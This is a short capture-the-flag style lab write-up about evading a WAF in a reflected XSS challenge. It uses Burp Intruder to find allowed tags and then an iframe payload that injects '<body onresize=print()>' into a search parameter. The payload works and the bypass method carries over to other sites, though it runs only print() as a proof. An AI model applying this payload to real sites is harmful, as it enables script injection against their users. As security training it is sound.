# Reflected XSS — WAF Bypass Using Intruder

## Goal

Bypass a WAF that blocks most HTML tags and attributes and execute
`print()`.

## What I Learned

The search functionality was vulnerable to reflected XSS, but a WAF blocked
common XSS tags and attributes.

Instead of guessing payloads, I used **Burp Intruder** to systematically
identify what was allowed.

### Methodology

```text
Test HTML tags
      ↓
Find an allowed tag
      ↓
Test event handlers / attributes
      ↓
Find an allowed attribute
      ↓
Build the payload
````

This was useful because the WAF's filtering rules determined which XSS
vectors were available.

## Exploit

I used an `<iframe>` with an `onload` handler:

```html
<iframe width="50px"
onload="this.style.width='1000px'"
src="https://TARGET/?search=<body onresize=print()>">
</iframe>
```

The important part is:

```html
<body onresize=print()>
```

The iframe's `onload` changes its width:

```js
this.style.width='1000px'
```

This causes a resize event, which triggers:

```text
onresize → print()
```

## Why the Exploit Works

```text
Iframe loads
    ↓
onload executes
    ↓
Iframe width changes
    ↓
Resize event occurs
    ↓
<body onresize=print()>
    ↓
print() executes
```

The payload was hosted on the **Exploit Server** and delivered to the victim.

## Key Takeaways

* WAFs can block common XSS vectors without eliminating the underlying XSS.
* Burp Intruder can systematically discover allowed tags and attributes.
* When common event handlers are blocked, other browser events may provide
  alternative execution paths.
* Understanding browser events is useful for constructing XSS payloads.
* A successful XSS payload depends on the HTML context and the filtering
  rules.

**Lab solved.**

